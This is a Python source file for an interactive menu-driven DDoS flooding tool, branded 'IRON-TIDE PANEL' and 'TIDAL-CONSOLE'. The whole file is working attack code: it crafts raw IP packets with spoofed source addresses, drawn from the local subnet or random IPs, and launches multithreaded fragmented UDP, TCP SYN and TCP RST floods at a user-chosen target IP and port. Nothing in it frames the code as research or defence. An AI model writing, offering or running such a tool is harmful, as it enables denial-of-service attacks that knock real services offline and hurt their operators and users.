#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# IRON-TIDE PANEL v1.1
# USAGE: python panel.py

import socket
import struct
import random
import time
import sys
import os
import threading
import argparse
import subprocess
import re
from collections import deque

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    C = True
except:
    C = False
    class Fore: BLUE=MAGENTA=RESET=""
    class Style: BRIGHT=RESET_ALL=""

def ip_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF

def build_ip_header(src_ip, dst_ip, protocol, payload_len, ttl, ident=0):
    ver_ihl = 0x45; tos = 0; total_len = 20 + payload_len
    ident = ident or random.randint(1, 65535)
    flags_frag = 0; ttl = ttl; proto = protocol; check = 0
    src = socket.inet_aton(src_ip); dst = socket.inet_aton(dst_ip)
    header = struct.pack('!BBHHHBBH4s4s',
                         ver_ihl, tos, total_len, ident, flags_frag,
                         ttl, proto, check, src, dst)
    check = ip_checksum(header)
    return struct.pack('!BBHHHBBH4s4s',
                       ver_ihl, tos, total_len, ident, flags_frag,
                       ttl, proto, check, src, dst)

frag_id_counter = 0

def build_udp_fragment(src_ip, dst_ip, src_port, dst_port, payload, frag_offset=0):
    global frag_id_counter
    frag_id_counter = (frag_id_counter + 1) % 65536
    ident = frag_id_counter
    half = len(payload)//2
    if frag_offset == 0:
        frag_payload = payload[:half]; offset = 0; mf = 1
    else:
        frag_payload = payload[half:]; offset = (half + 7)//8; mf = 0
    udp_len = 8 + len(frag_payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
    version_ihl = 0x45; tos = 0
    total_len = 20 + len(udp_header) + len(frag_payload)
    flags_frag = (mf << 13) | offset
    ttl = 64; proto = 17; check = 0
    src = socket.inet_aton(src_ip); dst = socket.inet_aton(dst_ip)
    header = struct.pack('!BBHHHBBH4s4s',
                         version_ihl, tos, total_len, ident, flags_frag,
                         ttl, proto, check, src, dst)
    check = ip_checksum(header)
    header = struct.pack('!BBHHHBBH4s4s',
                         version_ihl, tos, total_len, ident, flags_frag,
                         ttl, proto, check, src, dst)
    return header + udp_header + frag_payload

def build_tcp_syn(src_ip, dst_ip, src_port, dst_port, seq=0, window=65535):
    if seq == 0: seq = random.randint(1000, 2**32-1)
    tcp = struct.pack('!HHLLBBHHH',
                      src_port, dst_port, seq, 0,
                      0x50, 0x02, window, 0, 0)
    pseudo = struct.pack('!4s4sBBH',
                         socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
                         0, 6, len(tcp))
    chk = ip_checksum(pseudo + tcp)
    tcp = struct.pack('!HHLLBBHHH',
                      src_port, dst_port, seq, 0,
                      0x50, 0x02, window, chk, 0)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp), ttl=random.randint(32, 128))
    return ip + tcp

def build_tcp_rst(src_ip, dst_ip, src_port, dst_port, seq=0, ack=0):
    if seq == 0: seq = random.randint(1000, 2**32-1)
    tcp = struct.pack('!HHLLBBHHH',
                      src_port, dst_port, seq, ack,
                      0x50, 0x04, 0, 0, 0)
    pseudo = struct.pack('!4s4sBBH',
                         socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
                         0, 6, len(tcp))
    chk = ip_checksum(pseudo + tcp)
    tcp = struct.pack('!HHLLBBHHH',
                      src_port, dst_port, seq, ack,
                      0x50, 0x04, 0, chk, 0)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp), ttl=random.randint(32, 128))
    return ip + tcp

class AttackState:
    def __init__(self):
        self.target_ip = "127.0.0.1"
        self.target_port = 0
        self.threads = 8
        self.duration = 0
        self.rate_mbps = 0
        self.vectors = {'udp': True, 'tcp_syn': True, 'tcp_rst': False}
        self.running = False
        self.stop_event = threading.Event()
        self.stats = {'packets': 0}
        self.worker_threads = []
        self.spoof_pool = []

state = AttackState()

def worker(target_ip, target_port, src_pool, vector_list, stop_event, stats, rate_limit_bps=0):
    raw = False
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)
        sock.setblocking(False)
        raw = True
    except:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)
            sock.setblocking(False)
        except:
            return

    src_ports = [random.randint(1024, 65535) for _ in range(200)]
    payload_udp = random._urandom(1400)
    bucket_tokens = 100000
    bucket_max = 100000
    bucket_last = time.time()
    rate = rate_limit_bps / 8.0 if rate_limit_bps else 0
    sent = 0

    while not stop_event.is_set():
        vec = random.choice(vector_list)
        src_ip = random.choice(src_pool)
        src_port = random.choice(src_ports)
        dst_port = target_port if target_port else random.randint(1, 65535)

        if vec == 'udp':
            if raw:
                p1 = build_udp_fragment(src_ip, target_ip, src_port, dst_port, payload_udp, 0)
                p2 = build_udp_fragment(src_ip, target_ip, src_port, dst_port, payload_udp, 1)
                try:
                    sock.sendto(p1, (target_ip, 0)); sock.sendto(p2, (target_ip, 0)); sent += 2
                except: pass
            else:
                try: sock.sendto(payload_udp, (target_ip, dst_port)); sent += 1
                except: pass
        elif vec == 'tcp_syn' and raw:
            seq = random.randint(1000, 2**32-1)
            win = random.choice([1024,4096,16384,65535])
            p = build_tcp_syn(src_ip, target_ip, src_port, dst_port, seq, win)
            try: sock.sendto(p, (target_ip, 0)); sent += 1
            except: pass
        elif vec == 'tcp_rst' and raw:
            seq = random.randint(1000, 2**32-1)
            ack = random.randint(0, 2**32-1)
            p = build_tcp_rst(src_ip, target_ip, src_port, dst_port, seq, ack)
            try: sock.sendto(p, (target_ip, 0)); sent += 1
            except: pass

        if rate > 0:
            now = time.time()
            elapsed = now - bucket_last
            bucket_last = now
            bucket_tokens = min(bucket_max, bucket_tokens + elapsed * rate)
            if bucket_tokens < 1: time.sleep(0.0001)
            else: bucket_tokens -= 1

        if sent % 1000 == 0:
            stats['packets'] += sent
            sent = 0
    if sock: sock.close()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    art = r"""
  ___ ___ ___ ___ ___ ___     ______   ______   _______ _______ _______ _______ 
 |   Y   |   Y   |   Y   |   |   _  \ |   _  \ |   _   |   _   |   _   |   _   \
 |   |   |.      |   |   |   |.  |   \|.  |   \|.  |   |   1___|.  1___|.  l   /
 |____   |. \_/  |____   |   |.  |    |.  |    |.  |   |____   |.  __)_|.  _   1
     |:  |:  |   |   |:  |   |:  1    |:  1    |:  1   |:  1   |:  1   |:  |   |
     |::.|::.|:. |   |::.|   |::.. . /|::.. . /|::.. . |::.. . |::.. . |::.|:. |
     `---`--- ---'   `---'   `------' `------' `-------`-------`-------`--- ---'
                                                                                
"""
    if C:
        lines = art.split('\n')
        # Only blue and magenta
        cols = [Fore.BLUE, Fore.MAGENTA]
        for i, line in enumerate(lines):
            print(cols[i % len(cols)] + line)
        print(Style.RESET_ALL)
    else:
        print(art)

def build_pool():
    my_ip = None
    try:
        if os.name == 'nt':
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            my_ip = s.getsockname()[0]; s.close()
        else:
            out = subprocess.check_output(['ip', 'route', 'get', '1']).decode()
            match = re.search(r'src (\d+\.\d+\.\d+\.\d+)', out)
            if match: my_ip = match.group(1)
    except: pass
    if my_ip:
        prefix = '.'.join(my_ip.split('.')[:3]) + '.'
        pool = [prefix + str(i) for i in range(1, 255) if i != int(my_ip.split('.')[-1])]
        if len(pool) < 10:
            pool = [f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(10000)]
    else:
        pool = [f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(10000)]
    return pool

def show_status():
    status = "RUNNING" if state.running else "STOPPED"
    color = Fore.BLUE if state.running else Fore.MAGENTA
    print(f"\n{Fore.MAGENTA}=== TIDAL-CONSOLE STATUS ===")
    print(f"{Fore.BLUE}  Target    : {state.target_ip}:{state.target_port or 'random'}")
    print(f"{Fore.BLUE}  Threads   : {state.threads}")
    print(f"{Fore.BLUE}  Duration  : {state.duration}s (0=infinite)")
    print(f"{Fore.BLUE}  Rate limit: {state.rate_mbps} Mbps")
    vecs = [v for v, en in state.vectors.items() if en]
    print(f"{Fore.BLUE}  Vectors   : {', '.join(vecs) if vecs else 'NONE'}")
    print(f"{Fore.BLUE}  Status    : {color}{status}{Style.RESET_ALL}")
    if state.running:
        print(f"{Fore.MAGENTA}  Packets   : {state.stats['packets']} (since start)")

def show_menu():
    print(f"\n{Fore.MAGENTA}=== COMMANDS ===")
    print(f"{Fore.BLUE}  [1] Set target IP")
    print(f"{Fore.BLUE}  [2] Set port")
    print(f"{Fore.BLUE}  [3] Set thread count")
    print(f"{Fore.BLUE}  [4] Set duration")
    print(f"{Fore.BLUE}  [5] Set rate limit (Mbps)")
    print(f"{Fore.BLUE}  [6] Toggle vectors (UDP, TCP SYN, TCP RST)")
    print(f"{Fore.BLUE}  [7] Start attack")
    print(f"{Fore.BLUE}  [8] Stop attack")
    print(f"{Fore.BLUE}  [9] Show status")
    print(f"{Fore.BLUE}  [0] Exit")
    print(Style.RESET_ALL)

def toggle_vectors():
    print(f"\n{Fore.MAGENTA}Current vectors:")
    for v in state.vectors:
        print(f"  {Fore.BLUE}{v}: {'ON' if state.vectors[v] else 'OFF'}")
    choice = input(f"{Fore.MAGENTA}Enter vector name to toggle (udp/tcp_syn/tcp_rst) or 'all': ").strip().lower()
    if choice == 'all':
        for v in state.vectors:
            state.vectors[v] = not state.vectors[v]
    elif choice in state.vectors:
        state.vectors[choice] = not state.vectors[choice]
    else:
        print(Fore.MAGENTA + "Invalid.")

def start_attack():
    if state.running:
        print(Fore.MAGENTA + "Already running.")
        return
    vec_list = [v for v, en in state.vectors.items() if en]
    if not vec_list:
        print(Fore.MAGENTA + "No vectors enabled.")
        return
    state.spoof_pool = build_pool()
    print(Fore.BLUE + f"Pool size: {len(state.spoof_pool)}")
    state.stats['packets'] = 0
    state.stop_event.clear()
    state.running = True
    rate_bps = state.rate_mbps * 1000000 if state.rate_mbps > 0 else 0
    for _ in range(state.threads):
        t = threading.Thread(target=worker,
                             args=(state.target_ip, state.target_port, state.spoof_pool,
                                   vec_list, state.stop_event, state.stats, rate_bps))
        t.daemon = True
        t.start()
        state.worker_threads.append(t)
    print(Fore.BLUE + f"Started with {state.threads} threads.")

def stop_attack():
    if not state.running:
        print(Fore.MAGENTA + "Not running.")
        return
    state.stop_event.set()
    state.running = False
    for t in state.worker_threads:
        t.join(timeout=1)
    state.worker_threads.clear()
    print(Fore.MAGENTA + "Stopped.")

def set_target():
    ip = input(f"{Fore.MAGENTA}Target IP: ").strip()
    try:
        socket.inet_aton(ip)
        state.target_ip = ip
        print(Fore.BLUE + f"Set to {ip}")
    except:
        print(Fore.MAGENTA + "Invalid IP.")

def set_port():
    p = input(f"{Fore.MAGENTA}Port (0=random): ").strip()
    try:
        state.target_port = int(p)
        print(Fore.BLUE + f"Port set to {state.target_port}")
    except:
        print(Fore.MAGENTA + "Invalid.")

def set_threads():
    t = input(f"{Fore.MAGENTA}Threads: ").strip()
    try:
        state.threads = max(1, int(t))
        print(Fore.BLUE + f"Threads set to {state.threads}")
    except:
        print(Fore.MAGENTA + "Invalid.")

def set_duration():
    d = input(f"{Fore.MAGENTA}Seconds (0=infinite): ").strip()
    try:
        state.duration = int(d)
        print(Fore.BLUE + f"Duration set to {state.duration}s")
    except:
        print(Fore.MAGENTA + "Invalid.")

def set_rate():
    r = input(f"{Fore.MAGENTA}Mbps (0=unlimited): ").strip()
    try:
        state.rate_mbps = int(r)
        print(Fore.BLUE + f"Rate limit set to {state.rate_mbps} Mbps")
    except:
        print(Fore.MAGENTA + "Invalid.")

def main():
    clear()
    print_banner()
    print(Fore.MAGENTA + Style.BRIGHT + "  TIDAL-CONSOLE v1.1" + Style.RESET_ALL)
    state.spoof_pool = build_pool()
    while True:
        show_status()
        show_menu()
        cmd = input(f"{Fore.MAGENTA}> ").strip()
        if cmd == '1': set_target()
        elif cmd == '2': set_port()
        elif cmd == '3': set_threads()
        elif cmd == '4': set_duration()
        elif cmd == '5': set_rate()
        elif cmd == '6': toggle_vectors()
        elif cmd == '7': start_attack()
        elif cmd == '8': stop_attack()
        elif cmd == '9': show_status(); input("Press Enter...")
        elif cmd == '0':
            if state.running: stop_attack()
            print(Fore.MAGENTA + "Exit.")
            sys.exit(0)
        else:
            print(Fore.MAGENTA + "Unknown.")
        time.sleep(0.5)
        clear()

if __name__ == "__main__":
    main()